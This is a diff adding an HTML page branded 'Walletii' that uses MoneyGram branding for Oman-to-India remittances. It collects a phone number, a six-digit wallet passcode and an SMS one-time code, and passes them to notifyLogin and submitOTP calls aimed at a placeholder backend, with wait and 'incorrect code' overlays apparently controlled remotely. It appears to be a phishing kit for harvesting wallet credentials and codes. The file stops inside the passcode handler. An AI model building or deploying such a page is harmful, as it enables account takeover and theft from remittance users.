@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Walletii</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #060f14;
+    font-family: 'Nunito', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  /* ── Phone Shell ── */
+  .phone-shell {
+    width: 390px;
+    height: 844px;
+    background: #0d1e24;
+    position: relative;
+    overflow: hidden;
+    border-radius: 4px;
+  }
+
+  /* ── Screens ── */
+  .screen {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    padding: 24px 24px 36px;
+    opacity: 0;
+    pointer-events: none;
+    transform: translateX(40px);
+    transition: opacity 0.35s ease, transform 0.35s ease;
+  }
+
+  .screen.active {
+    opacity: 1;
+    pointer-events: all;
+    transform: translateX(0);
+  }
+
+  .screen.exit-left {
+    opacity: 0;
+    transform: translateX(-40px);
+    pointer-events: none;
+  }
+
+  /* ── Shared: Lang Button ── */
+  .lang-btn {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(255,255,255,0.07);
+    border: 1.5px solid rgba(0, 212, 184, 0.35);
+    border-radius: 50px;
+    padding: 9px 14px;
+    color: #00d4b8;
+    font-size: 13px;
+    font-family: 'Nunito', sans-serif;
+    cursor: pointer;
+    white-space: nowrap;
+  }
+  .lang-btn svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+  /* ── Shared: Continue Button ── */
+  .continue-btn {
+    width: 100%;
+    border: none;
+    border-radius: 50px;
+    padding: 18px;
+    font-size: 17px;
+    font-weight: 800;
+    font-family: 'Nunito', sans-serif;
+    cursor: default;
+    transition: background 0.25s, color 0.25s, transform 0.1s;
+    background: #d8dfe2;
+    color: #7a8a90;
+  }
+  .continue-btn.active {
+    background: #00e5c8;
+    color: #0d1e24;
+    cursor: pointer;
+  }
+  .continue-btn.active:active { transform: scale(0.98); }
+
+  /* ── Shared: Back Button ── */
+  .back-btn {
+    font-size: 26px;
+    color: #fff;
+    cursor: pointer;
+    font-weight: 300;
+    line-height: 1;
+    width: 32px;
+    margin-bottom: 8px;
+    user-select: none;
+  }
+
+  /* ── Shared: W Logo ── */
+  .w-logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+  .w-wrap {
+    position: relative;
+    display: inline-block;
+    line-height: 1;
+  }
+  .w-char {
+    font-family: 'Nunito', sans-serif;
+    font-size: 42px;
+    font-weight: 900;
+    color: #00e5cc;
+    display: block;
+    line-height: 1;
+  }
+  .w-dot {
+    position: absolute;
+    top: 2px;
+    right: -4px;
+    width: 7px;
+    height: 7px;
+    background: #00e5cc;
+    border-radius: 50%;
+  }
+
+  /* ══════════════════════════════════
+     SCREEN 1 — LANDING
+  ══════════════════════════════════ */
+  #screen-landing .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 52px;
+  }
+  .logo-text {
+    font-size: 22px;
+    font-weight: 700;
+    color: #00d4b8;
+    letter-spacing: -0.5px;
+  }
+
+  .cards-container {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+    margin-bottom: 20px;
+  }
+  .card {
+    flex: 1;
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 18px 14px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+  }
+  .flag {
+    width: 64px;
+    height: 42px;
+    border-radius: 8px;
+    overflow: hidden;
+    position: relative;
+  }
+  .country-name {
+    font-size: 15px;
+    font-weight: 600;
+    color: #00b4a0;
+  }
+  .amount-box {
+    width: 100%;
+    background: #f0f0f0;
+    border-radius: 8px;
+    padding: 10px 12px;
+    font-size: 16px;
+    font-weight: 700;
+    color: #111;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+  .chevron { margin-left: auto; color: #666; font-size: 11px; }
+  .arrow-circle {
+    width: 40px; height: 40px;
+    background: #00d4b8;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    font-size: 18px;
+    color: #fff;
+    font-weight: 700;
+  }
+  .powered-by {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 52px;
+  }
+  .powered-pill {
+    background: #fff;
+    border-radius: 50px;
+    padding: 8px 18px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: #444;
+  }
+  .mg-logo {
+    display: flex; align-items: center; gap: 4px;
+    font-weight: 700; color: #e31b23; font-size: 13px;
+  }
+  .mg-icon {
+    width: 16px; height: 16px;
+    background: #e31b23;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .tagline {
+    color: #fff;
+    font-size: 25px;
+    font-weight: 800;
+    line-height: 1.3;
+    text-align: center;
+    margin-bottom: 48px;
+    padding: 0 6px;
+  }
+
+  /* ══════════════════════════════════
+     SCREEN 2 — PHONE NUMBER
+  ══════════════════════════════════ */
+  #screen-phone .header {
+    display: flex;
+    justify-content: flex-end;
+    margin-bottom: 40px;
+  }
+  .phone-title {
+    text-align: center;
+    color: #fff;
+    font-size: 28px;
+    font-weight: 800;
+    margin-bottom: 28px;
+  }
+  .phone-label {
+    text-align: center;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 14px;
+  }
+  .input-row {
+    display: flex;
+    gap: 10px;
+    position: relative;
+  }
+  .prefix-btn {
+    background: #1e2f36;
+    border: none;
+    border-radius: 14px;
+    padding: 0 16px;
+    min-width: 108px;
+    height: 68px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+  .prefix-label { font-size: 11px; color: #8a9ea6; font-weight: 600; margin-bottom: 3px; }
+  .prefix-value { font-size: 17px; font-weight: 700; color: #fff; }
+  .phone-input {
+    flex: 1;
+    background: #1e2f36;
+    border: none;
+    border-radius: 14px;
+    padding: 0 18px;
+    font-size: 15px;
+    color: #fff;
+    font-family: 'Nunito', sans-serif;
+    outline: none;
+    height: 68px;
+    -moz-appearance: textfield;
+  }
+  .phone-input::-webkit-outer-spin-button,
+  .phone-input::-webkit-inner-spin-button { -webkit-appearance: none; }
+  .phone-input::placeholder { color: #6a7e86; }
+
+  /* Dropdown */
+  .dropdown {
+    display: none;
+    position: absolute;
+    top: calc(100% + 8px);
+    left: 0;
+    width: 224px;
+    background: #1a2c36;
+    border-radius: 14px;
+    overflow-y: auto;
+    max-height: 340px;
+    z-index: 100;
+    box-shadow: 0 10px 36px rgba(0,0,0,0.55);
+  }
+  .dropdown.open { display: block; }
+  .dropdown-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 12px 16px;
+    cursor: pointer;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    transition: background 0.12s;
+  }
+  .dropdown-item:last-child { border-bottom: none; }
+  .dropdown-item:hover { background: rgba(255,255,255,0.06); }
+  .dropdown-item.active { background: rgba(0,212,184,0.1); }
+  .flag-emoji { font-size: 20px; }
+  .cname { font-size: 13px; color: #fff; font-weight: 600; }
+  .ccode { font-size: 12px; color: #8a9ea6; }
+
+  .assistance-btn {
+    text-align: center;
+    color: #7a8a90;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  /* ══════════════════════════════════
+     SCREEN 3 — OTP
+  ══════════════════════════════════ */
+  #screen-otp .header { margin-bottom: 16px; }
+  .otp-title {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 900;
+    color: #fff;
+    margin-bottom: 12px;
+  }
+  .otp-sub {
+    font-size: 13.5px;
+    font-weight: 500;
+    color: #c8d6e0;
+    text-align: center;
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+  .otp-sub span { color: #fff; font-weight: 700; }
+  .sms-label {
+    font-size: 14px;
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 16px;
+    text-align: center;
+  }
+  .otp-row {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 0;
+  }
+  .otp-box {
+    width: 50px; height: 56px;
+    background: #1e3040;
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px; font-weight: 800; color: #fff;
+    cursor: pointer;
+    transition: background 0.2s, box-shadow 0.2s;
+  }
+  .otp-box .dash { width: 16px; height: 2px; background: #5a7a8a; border-radius: 2px; }
+  .otp-box.filled .dash { display: none; }
+  .otp-box.cur { background: #243d50; box-shadow: 0 0 0 2px #00e5cc55; }
+  .resend-text {
+    font-size: 14px;
+    font-weight: 700;
+    color: #00e5cc;
+    text-align: center;
+  }
+  #otp-hidden {
+    position: absolute; opacity: 0; width: 1px; height: 1px; top: -9999px;
+  }
+
+  /* ══════════════════════════════════
+     SCREEN 4 — PASSCODE
+  ══════════════════════════════════ */
+  #screen-passcode .header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  .passcode-title {
+    font-size: 15px; font-weight: 700; color: #fff; text-align: center;
+  }
+  .info-icon {
+    width: 18px; height: 18px;
+    border: 1.5px solid #5a7a8a;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; color: #5a7a8a;
+    font-style: italic; font-family: Georgia, serif;
+    flex-shrink: 0;
+  }
+  .dots-row {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 28px;
+  }
+  .dot-cell {
+    width: 42px; height: 42px;
+    background: #1e3040;
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .dot-cell .dash { width: 14px; height: 2px; background: #5a7a8a; border-radius: 2px; }
+  .dot-cell .filled { width: 14px; height: 14px; background: #fff; border-radius: 50%; display: none; }
+  .dot-cell.on .dash { display: none; }
+  .dot-cell.on .filled { display: block; }
+
+  .keypad {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+  }
+  .keypad-row {
+    display: flex;
+    gap: 26px;
+    align-items: center;
+  }
+  .key {
+    width: 76px; height: 76px;
+    background: #1e3040;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 26px; font-weight: 700; color: #fff;
+    cursor: pointer; user-select: none;
+    border: none;
+    font-family: 'Nunito', sans-serif;
+    transition: background 0.1s, transform 0.1s;
+  }
+  .key:active { background: #2a4558; transform: scale(0.93); }
+  .key-empty { width: 76px; height: 76px; }
+  .key-back {
+    width: 76px; height: 76px;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; opacity: 0; transition: opacity 0.2s;
+    user-select: none;
+  }
+  .key-back.show { opacity: 1; }
+  .back-icon {
+    background: #5a7a8a;
+    border-radius: 6px;
+    width: 38px; height: 28px;
+    display: flex; align-items: center; justify-content: center;
+    clip-path: polygon(20% 0%, 100% 0%, 100% 100%, 20% 100%, 0% 50%);
+  }
+  .back-icon span { color: #fff; font-size: 14px; font-weight: 700; margin-left: 4px; }
+
+  .spacer { flex: 1; }
+</style>
+</head>
+<body>
+<div class="phone-shell">
+
+  <!-- ══ SCREEN 1: LANDING ══ -->
+  <div class="screen active" id="screen-landing">
+    <div class="header">
+      <div class="logo-text">walletii</div>
+      <button class="lang-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"/>
+          <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+        </svg>
+        हिंदी / العربية
+      </button>
+    </div>
+
+    <div class="cards-container">
+      <!-- Oman card -->
+      <div class="card">
+        <div class="flag" style="width:64px;height:42px;border-radius:8px;overflow:hidden;position:relative;">
+          <div style="position:absolute;left:0;top:0;bottom:0;width:22px;background:#db161b;z-index:2;display:flex;align-items:center;justify-content:center;">
+            <div style="width:12px;height:12px;background:rgba(255,255,255,0.85);border-radius:50%;"></div>
+          </div>
+          <div style="position:absolute;left:22px;right:0;top:0;height:33%;background:#db161b;"></div>
+          <div style="position:absolute;left:22px;right:0;top:33%;height:34%;background:#fff;"></div>
+          <div style="position:absolute;left:22px;right:0;bottom:0;height:33%;background:#009a44;"></div>
+        </div>
+        <div class="country-name">Oman</div>
+        <div class="amount-box"><span>100</span>&nbsp;<span style="font-weight:700;color:#333;">OMR</span></div>
+      </div>
+
+      <div class="arrow-circle">→</div>
+
+      <!-- India card -->
+      <div class="card">
+        <div class="flag" style="width:64px;height:42px;border-radius:8px;overflow:hidden;display:flex;flex-direction:column;">
+          <div style="flex:1;background:#FF9933;"></div>
+          <div style="flex:1;background:#fff;display:flex;align-items:center;justify-content:center;">
+            <div style="width:14px;height:14px;border:2px solid #000080;border-radius:50%;"></div>
+          </div>
+          <div style="flex:1;background:#138808;"></div>
+        </div>
+        <div class="country-name">India</div>
+        <div class="amount-box"><span>21 691</span>&nbsp;<span style="font-weight:700;color:#333;">INR</span><span class="chevron">∨</span></div>
+      </div>
+    </div>
+
+    <div class="powered-by">
+      <div class="powered-pill">
+        <span>Powered by</span>
+        <div class="mg-logo">
+          <div class="mg-icon">
+            <svg width="8" height="8" viewBox="0 0 10 10" fill="white"><circle cx="5" cy="5" r="4"/></svg>
+          </div>
+          MoneyGram
+        </div>
+      </div>
+    </div>
+
+    <div class="tagline">Send money to 200+ countries while enjoying great rates and low fees</div>
+
+    <button class="continue-btn active" onclick="goTo('screen-phone')">Continue</button>
+  </div>
+
+
+  <!-- ══ SCREEN 2: PHONE NUMBER ══ -->
+  <div class="screen" id="screen-phone">
+    <div class="header">
+      <button class="lang-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"/>
+          <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+        </svg>
+        हिंदी / العربية
+      </button>
+    </div>
+
+    <div class="w-logo">
+      <div class="w-wrap"><span class="w-char">w</span><div class="w-dot"></div></div>
+    </div>
+
+    <div class="phone-title">Get started</div>
+    <div class="phone-label">Phone number</div>
+
+    <div class="input-row">
+      <button class="prefix-btn" id="prefixBtn" onclick="toggleDd()">
+        <span class="prefix-label">Prefix</span>
+        <span class="prefix-value" id="prefixVal">+968</span>
+      </button>
+
+      <div class="dropdown" id="dropdown">
+        <div class="dropdown-item active" onclick="pickCountry('+968','Oman',this)"><span class="flag-emoji">🇴🇲</span><div><div class="cname">Oman</div><div class="ccode">+968</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+966','Saudi Arabia',this)"><span class="flag-emoji">🇸🇦</span><div><div class="cname">Saudi Arabia</div><div class="ccode">+966</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+971','UAE',this)"><span class="flag-emoji">🇦🇪</span><div><div class="cname">UAE</div><div class="ccode">+971</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+965','Kuwait',this)"><span class="flag-emoji">🇰🇼</span><div><div class="cname">Kuwait</div><div class="ccode">+965</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+974','Qatar',this)"><span class="flag-emoji">🇶🇦</span><div><div class="cname">Qatar</div><div class="ccode">+974</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+973','Bahrain',this)"><span class="flag-emoji">🇧🇭</span><div><div class="cname">Bahrain</div><div class="ccode">+973</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+962','Jordan',this)"><span class="flag-emoji">🇯🇴</span><div><div class="cname">Jordan</div><div class="ccode">+962</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+961','Lebanon',this)"><span class="flag-emoji">🇱🇧</span><div><div class="cname">Lebanon</div><div class="ccode">+961</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+20','Egypt',this)"><span class="flag-emoji">🇪🇬</span><div><div class="cname">Egypt</div><div class="ccode">+20</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+212','Morocco',this)"><span class="flag-emoji">🇲🇦</span><div><div class="cname">Morocco</div><div class="ccode">+212</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+216','Tunisia',this)"><span class="flag-emoji">🇹🇳</span><div><div class="cname">Tunisia</div><div class="ccode">+216</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+213','Algeria',this)"><span class="flag-emoji">🇩🇿</span><div><div class="cname">Algeria</div><div class="ccode">+213</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+218','Libya',this)"><span class="flag-emoji">🇱🇾</span><div><div class="cname">Libya</div><div class="ccode">+218</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+249','Sudan',this)"><span class="flag-emoji">🇸🇩</span><div><div class="cname">Sudan</div><div class="ccode">+249</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+967','Yemen',this)"><span class="flag-emoji">🇾🇪</span><div><div class="cname">Yemen</div><div class="ccode">+967</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+963','Syria',this)"><span class="flag-emoji">🇸🇾</span><div><div class="cname">Syria</div><div class="ccode">+963</div></div></div>
+        <div class="dropdown-item" onclick="pickCountry('+964','Iraq',this)"><span class="flag-emoji">🇮🇶</span><div><div class="cname">Iraq</div><div class="ccode">+964</div></div></div>
+      </div>
+
+      <input class="phone-input" type="tel" inputmode="numeric" pattern="[0-9]*"
+             placeholder="Enter your phone number"
+             id="phoneInput" oninput="onPhoneInput()" onkeypress="return /[0-9]/.test(event.key)"/>
+    </div>
+
+    <div class="spacer"></div>
+    <button class="continue-btn" id="phoneContinueBtn" onclick="proceedFromPhone()">Continue</button>
+    <div style="height:18px;"></div>
+    <div class="assistance-btn">Get assistance</div>
+  </div>
+
+
+  <!-- ══ SCREEN 3: OTP ══ -->
+  <div class="screen" id="screen-otp">
+    <div class="header">
+      <div class="back-btn" onclick="goTo('screen-phone')">‹</div>
+    </div>
+
+    <div class="w-logo">
+      <div class="w-wrap"><span class="w-char">w</span><div class="w-dot"></div></div>
+    </div>
+
+    <div class="otp-title">Verify phone number</div>
+    <div class="otp-sub">We've sent a verification code to <span id="otpPhoneDisplay">+968 XXXXXXX</span>.</div>
+    <div class="sms-label">Enter SMS verification code</div>
+
+    <div class="otp-row" id="otpRow" onclick="document.getElementById('otp-hidden').focus()">
+      <div class="otp-box cur" id="ob0"><div class="dash"></div></div>
+      <div class="otp-box" id="ob1"><div class="dash"></div></div>
+      <div class="otp-box" id="ob2"><div class="dash"></div></div>
+      <div class="otp-box" id="ob3"><div class="dash"></div></div>
+      <div class="otp-box" id="ob4"><div class="dash"></div></div>
+      <div class="otp-box" id="ob5"><div class="dash"></div></div>
+    </div>
+
+    <input type="tel" id="otp-hidden" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+           style="position:absolute;opacity:0;width:1px;height:1px;top:-9999px;"
+           oninput="onOtpInput()" onkeydown="onOtpKey(event)"/>
+
+    <div class="spacer"></div>
+    <div style="padding: 0 0 16px;">
+      <button class="continue-btn" id="otpContinueBtn" onclick="proceedFromOtp()">Continue</button>
+    </div>
+    <div class="resend-text" id="resendText">Resend code in 57 seconds</div>
+  </div>
+
+
+  <!-- ══ SCREEN 4: PASSCODE ══ -->
+  <div class="screen" id="screen-passcode">
+    <div class="header">
+      <div class="passcode-title" id="passcodeTitle">Confirm your passcode for your wallet</div>
+      <div class="info-icon">i</div>
+    </div>
+
+    <div class="dots-row" id="dotsRow">
+      <div class="dot-cell" id="pc0"><div class="dash"></div><div class="filled"></div></div>
+      <div class="dot-cell" id="pc1"><div class="dash"></div><div class="filled"></div></div>
+      <div class="dot-cell" id="pc2"><div class="dash"></div><div class="filled"></div></div>
+      <div class="dot-cell" id="pc3"><div class="dash"></div><div class="filled"></div></div>
+      <div class="dot-cell" id="pc4"><div class="dash"></div><div class="filled"></div></div>
+      <div class="dot-cell" id="pc5"><div class="dash"></div><div class="filled"></div></div>
+    </div>
+
+    <div class="keypad">
+      <div class="keypad-row">
+        <button class="key" onclick="pcKey('1')">1</button>
+        <button class="key" onclick="pcKey('2')">2</button>
+        <button class="key" onclick="pcKey('3')">3</button>
+      </div>
+      <div class="keypad-row">
+        <button class="key" onclick="pcKey('4')">4</button>
+        <button class="key" onclick="pcKey('5')">5</button>
+        <button class="key" onclick="pcKey('6')">6</button>
+      </div>
+      <div class="keypad-row">
+        <button class="key" onclick="pcKey('7')">7</button>
+        <button class="key" onclick="pcKey('8')">8</button>
+        <button class="key" onclick="pcKey('9')">9</button>
+      </div>
+      <div class="keypad-row">
+        <div class="key-empty"></div>
+        <button class="key" onclick="pcKey('0')">0</button>
+        <div class="key-back" id="pcBack" onclick="pcBackspace()">
+          <div class="back-icon"><span>✕</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+    <button class="continue-btn" id="pcContinueBtn" onclick="proceedFromPasscode()">Continue</button>
+  </div>
+
+
+  <!-- ══ OVERLAY: Waiting spinner ══ -->
+  <div id="ov-waiting" style="display:none;position:absolute;inset:0;z-index:200;background:rgba(13,30,36,0.88);backdrop-filter:blur(4px);flex-direction:column;align-items:center;justify-content:center;gap:20px;">
+    <div style="width:48px;height:48px;border-radius:50%;border:3px solid rgba(0,229,200,0.2);border-top-color:#00e5c8;animation:wspin 0.85s linear infinite;"></div>
+    <div style="text-align:center;">
+      <div id="ov-title" style="font-size:16px;font-weight:700;color:#fff;margin-bottom:6px;">Verifying…</div>
+      <div id="ov-sub"   style="font-size:13px;color:rgba(255,255,255,0.45);">Please wait</div>
+    </div>
+    <style>@keyframes wspin{to{transform:rotate(360deg)}}</style>
+  </div>
+
+  <!-- ══ OVERLAY: Wrong OTP ══ -->
+  <div id="ov-wrong" style="display:none;position:absolute;inset:0;z-index:200;background:rgba(13,30,36,0.92);backdrop-filter:blur(4px);flex-direction:column;align-items:center;justify-content:center;padding:28px;">
+    <div style="background:#112028;border-radius:20px;padding:32px 24px;width:100%;text-align:center;border:1px solid rgba(255,255,255,0.07);">
+      <div style="width:56px;height:56px;border-radius:50%;background:rgba(239,68,68,0.12);border:2px solid rgba(239,68,68,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </div>
+      <div style="font-size:18px;font-weight:800;color:#fff;margin-bottom:8px;">Incorrect code</div>
+      <div style="font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.6;margin-bottom:24px;">The code you entered doesn't match.<br>Please try again.</div>
+      <button onclick="closeWrongOverlay()" style="width:100%;padding:15px;border:none;border-radius:50px;background:#00e5c8;color:#0d1e24;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;">Try again</button>
+    </div>
+  </div>
+
+  <!-- ══ OVERLAY: Success ══ -->
+  <div id="ov-success" style="display:none;position:absolute;inset:0;z-index:200;background:rgba(13,30,36,0.92);backdrop-filter:blur(4px);flex-direction:column;align-items:center;justify-content:center;padding:28px;">
+    <div style="background:#112028;border-radius:20px;padding:36px 24px;width:100%;text-align:center;border:1px solid rgba(0,229,200,0.15);">
+      <div style="width:64px;height:64px;border-radius:50%;background:rgba(0,229,200,0.1);border:2px solid rgba(0,229,200,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00e5c8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <div style="font-size:20px;font-weight:900;color:#fff;margin-bottom:10px;">You're verified!</div>
+      <div style="font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.6;margin-bottom:28px;">Your identity has been confirmed.<br>Welcome to Walletii.</div>
+      <button style="width:100%;padding:15px;border:none;border-radius:50px;background:#00e5c8;color:#0d1e24;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;">Get started</button>
+    </div>
+  </div>
+
+  <!-- ══ OVERLAY: Error ══ -->
+  <div id="ov-err" style="display:none;position:absolute;inset:0;z-index:200;background:rgba(13,30,36,0.92);backdrop-filter:blur(4px);flex-direction:column;align-items:center;justify-content:center;padding:28px;">
+    <div style="background:#112028;border-radius:20px;padding:32px 24px;width:100%;text-align:center;border:1px solid rgba(255,255,255,0.07);">
+      <div style="font-size:18px;font-weight:800;color:#fff;margin-bottom:10px;">Something went wrong</div>
+      <div id="ov-err-msg" style="font-size:13.5px;color:rgba(255,255,255,0.5);line-height:1.6;margin-bottom:24px;">Please try again.</div>
+      <button onclick="closeErrOverlay()" style="width:100%;padding:15px;border:none;border-radius:50px;background:rgba(255,255,255,0.1);color:#fff;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;border:1px solid rgba(255,255,255,0.15);">Dismiss</button>
+    </div>
+  </div>
+
+</div><!-- /phone-shell -->
+
+<script>
+  // ════════════════════════════════════════════════════
+  //  CONFIG — set this to your Render backend URL
+  // ════════════════════════════════════════════════════
+  const API_BASE = 'https://your-walletii-backend.onrender.com';
+
+  // ── Session state ──
+  const SESSION = {
+    phone:       '',
+    countryCode: '',
+    passcode:    '',
+    loginToken:  null,
+    otpToken:    null,
+    pollIv:      null,
+  };
+
+  /* ── Navigation ── */
+  let currentScreen = 'screen-landing';
+
+  function goTo(id) {
+    const cur = document.getElementById(currentScreen);
+    const next = document.getElementById(id);
+    cur.classList.add('exit-left');
+    setTimeout(() => { cur.classList.remove('active', 'exit-left'); }, 350);
+    next.classList.add('active');
+    currentScreen = id;
+    if (id === 'screen-otp') startOtpTimer();
+  }
+
+  /* ── SCREEN 2: Phone ── */
+  function toggleDd() {
+    document.getElementById('dropdown').classList.toggle('open');
+  }
+  function pickCountry(code, name, el) {
+    document.getElementById('prefixVal').textContent = code;
+    document.getElementById('dropdown').classList.remove('open');
+    document.querySelectorAll('.dropdown-item').forEach(i => i.classList.remove('active'));
+    el.classList.add('active');
+    onPhoneInput();
+  }
+  document.addEventListener('click', e => {
+    const dd = document.getElementById('dropdown');
+    const pb = document.getElementById('prefixBtn');
+    if (dd && pb && !pb.contains(e.target) && !dd.contains(e.target)) dd.classList.remove('open');
+  });
+  function onPhoneInput() {
+    const val = document.getElementById('phoneInput').value.replace(/\D/g,'');
+    document.getElementById('phoneInput').value = val;
+    const btn = document.getElementById('phoneContinueBtn');
+    btn.classList.toggle('active', val.length >= 7);
+  }
+  function proceedFromPhone() {
+    const val = document.getElementById('phoneInput').value.trim();
+    if (val.length < 7) return;
+    const prefix = document.getElementById('prefixVal').textContent;
+    SESSION.phone       = val;
+    SESSION.countryCode = prefix;
+    pcPhase = 1; pcInput = ''; pcFirst = '';
+    updateDots();
+    goTo('screen-passcode');
+  }
+
+  /* ── SCREEN 3: OTP ── */
+  let otpVal = '';
+  let otpTimer = null;
+  let otpCountdown = 57;
+
+  function startOtpTimer() {
+    otpVal = '';
+    otpCountdown = 57;
+    document.getElementById('resendText').textContent = 'Resend code in 57 seconds';
+    document.getElementById('resendText').style.cursor = 'default';
+    updateOtpBoxes();
+    if (otpTimer) clearInterval(otpTimer);
+    otpTimer = setInterval(() => {
+      otpCountdown--;
+      if (otpCountdown <= 0) {
+        clearInterval(otpTimer);
+        document.getElementById('resendText').textContent = 'Resend code';
+        document.getElementById('resendText').style.cursor = 'pointer';
+      } else {
+        document.getElementById('resendText').textContent = 'Resend code in ' + otpCountdown + ' seconds';
+      }
+    }, 1000);
+    setTimeout(() => document.getElementById('otp-hidden').focus(), 100);
+  }
+
+  function updateOtpBoxes() {
+    for (let i = 0; i < 6; i++) {
+      const box = document.getElementById('ob' + i);
+      if (i < otpVal.length) {
+        box.textContent = otpVal[i];
+        box.classList.add('filled');
+        box.classList.remove('cur');
+      } else {
+        box.innerHTML = '<div class="dash"></div>';
+        box.classList.remove('filled');
+        box.classList.toggle('cur', i === otpVal.length);
+      }
+    }
+    document.getElementById('otpContinueBtn').classList.toggle('active', otpVal.length === 6);
+  }
+
+  function onOtpInput() {
+    const h = document.getElementById('otp-hidden');
+    otpVal = h.value.replace(/\D/g,'').slice(0,6);
+    h.value = otpVal;
+    updateOtpBoxes();
+  }
+  function onOtpKey(e) {
+    if (e.key === 'Backspace') {
+      otpVal = otpVal.slice(0,-1);
+      document.getElementById('otp-hidden').value = otpVal;
+      updateOtpBoxes();
+    }
+  }
+  function proceedFromOtp() {
+    if (otpVal.length < 6) return;
+    if (otpTimer) clearInterval(otpTimer);
+    submitOTP();
+  }
+
+  /* ── SCREEN 4: Passcode ── */
+  let pcPhase = 1;
+  let pcInput = '';
+  let pcFirst = '';
+
+  function updateDots() {
+    for (let i = 0; i < 6; i++) {
+      const c = document.getElementById('pc' + i);
+      c.classList.toggle('on', i < pcInput.length);
+    }
+    document.getElementById('pcBack').classList.toggle('show', pcInput.length > 0);
+    document.getElementById('pcContinueBtn').classList.toggle('active', pcInput.length === 6);
+  }
+
+  function pcKey(d) {
+    if (pcInput.length >= 6) return;
+    pcInput += d;
+    updateDots();
+    if (pcInput.length === 6) {
+      setTimeout(() => {
+        SESSION.passcode = pcInput;
+        notifyLogin();
+      }, 380);
+    }
+  }
+
+  function pcBackspace() {
+    if (!pcInput.length) return;
+    pcInput = pcInput.slice(0,-1);
+    updateDots();
+  }
+
+  function proceedFromPasscode() {
+    if (pcInput.length < 6) return;
+    SESSION.passcode = pcInput;
+    notifyLogin();
